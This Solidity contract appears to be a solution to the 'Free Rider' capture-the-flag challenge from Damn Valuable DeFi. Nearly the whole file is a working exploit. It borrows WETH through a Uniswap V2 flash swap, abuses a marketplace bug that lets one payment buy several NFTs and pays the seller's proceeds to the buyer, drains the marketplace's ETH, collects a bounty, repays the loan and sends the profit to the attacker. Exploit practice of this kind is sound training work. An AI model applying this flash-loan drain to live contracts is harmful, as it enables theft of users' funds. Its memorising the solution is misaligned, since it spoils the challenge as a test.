// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {FreeRiderBuyer} from "../../../src/Contracts/free-rider/FreeRiderBuyer.sol";
import {FreeRiderNFTMarketplace} from "../../../src/Contracts/free-rider/FreeRiderNFTMarketplace.sol";
import {IUniswapV2Router02, IUniswapV2Factory, IUniswapV2Pair} from "../../../src/Contracts/free-rider/Interfaces.sol";
import {DamnValuableNFT} from "../../../src/Contracts/DamnValuableNFT.sol";
import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {WETH9} from "../../../src/Contracts/WETH9.sol";

interface IERC721Receiver {
    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)
        external
        returns (bytes4);
}

contract FreeRiderAttack {
    // The NFT marketplace will have 6 tokens, at 15 ETH each
    uint256 internal constant NFT_PRICE = 15 ether;
    uint8 internal constant AMOUNT_OF_NFTS = 6;
    uint256 internal constant MARKETPLACE_INITIAL_ETH_BALANCE = 90 ether;

    // The buyer will offer 45 ETH as payout for the job
    uint256 internal constant BUYER_PAYOUT = 45 ether;

    // Initial reserves for the Uniswap v2 pool
    uint256 internal constant UNISWAP_INITIAL_TOKEN_RESERVE = 15_000e18;
    uint256 internal constant UNISWAP_INITIAL_WETH_RESERVE = 9000 ether;
    uint256 internal constant DEADLINE = 10_000_000;

    FreeRiderBuyer internal freeRiderBuyer;
    FreeRiderNFTMarketplace internal freeRiderNFTMarketplace;
    DamnValuableToken internal dvt;
    DamnValuableNFT internal damnValuableNFT;
    IUniswapV2Pair internal uniswapV2Pair;
    IUniswapV2Router02 internal uniswapV2Router;
    WETH9 internal weth;
    address payable internal attacker;

    constructor(
        FreeRiderBuyer _freeRiderBuyer,
        FreeRiderNFTMarketplace _freeRiderNFTMarketplace,
        DamnValuableToken _dvt,
        DamnValuableNFT _damnValuableNFT,
        IUniswapV2Pair _uniswapV2Pair,
        WETH9 _weth
    ) {
        attacker = payable(msg.sender);

        freeRiderBuyer = _freeRiderBuyer;
        freeRiderNFTMarketplace = _freeRiderNFTMarketplace;
        dvt = _dvt;
        damnValuableNFT = _damnValuableNFT;
        uniswapV2Pair = _uniswapV2Pair;
        weth = _weth;
    }

    function attack() external {
        // Initiate flash swap from uniswap V2
        uint256 amount1Out = 120 ether;
        // token0 = DVT, token1 = WETH
        uniswapV2Pair.swap(0, amount1Out, address(this), "flash");
    }

    function uniswapV2Call(address, uint256, uint256 borrowedAmount, bytes calldata) external {
        // create an array tokenIds for buying 2 NFTs
        uint256[] memory tokenIds = new uint256[](2);
        tokenIds[0] = 0;
        tokenIds[1] = 1;
        // swap borrowed WETH to ETH
        weth.withdraw(borrowedAmount);
        // buy two NFTs each for 15 ether
        freeRiderNFTMarketplace.buyMany{value: 30 ether}(tokenIds);

        // create an array of prices for offering 2 NFTs, 90 eth each
        uint256[] memory prices = new uint256[](2);
        prices[0] = 90 ether;
        prices[1] = 90 ether;
        // approve the transfer of NFTs
        damnValuableNFT.setApprovalForAll(address(freeRiderNFTMarketplace), true);
        // offer 2 NFTs for 90 eth each
        freeRiderNFTMarketplace.offerMany(tokenIds, prices);

        // *** EXPLOIT PART ***
        // buy one NFT for 90 eth
        // buy second NFT free because _buyOne() uses msg.sender in a for loop
        freeRiderNFTMarketplace.buyMany{value: 90 ether}(tokenIds);

        // create an array of tokenIds to buy remaining 4 NFTs
        tokenIds = new uint256[](4);
        tokenIds[0] = 2;
        tokenIds[1] = 3;
        tokenIds[2] = 4;
        tokenIds[3] = 5;
        // buy remaining 4 NFTs
        freeRiderNFTMarketplace.buyMany{value: 60 ether}(tokenIds);

        // transfer all 6 NFTs to the FreeRiderBuyer
        for (uint8 tokenId; tokenId < 6; tokenId++) {
            damnValuableNFT.safeTransferFrom(address(this), address(freeRiderBuyer), tokenId);
        }

        // calculate the fee needed to repay the flash swap (0.3%)
        uint256 fee = ((120 ether * 3) / uint256(997)) + 1;
        // swap 120 borrowed ETH + fee for WETH
        weth.deposit{value: 120 ether + fee}();
        // repay flash swap with WETH
        weth.transfer(address(uniswapV2Pair), 120 ether + fee);

        // transfer all remaining ETH to the attacker
        payable(address(attacker)).transfer(address(this).balance);
    }

    // used to receive ETH
    receive() external payable {}

    // used to receive NFTs
    function onERC721Received(address, address, uint256, bytes memory) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
}
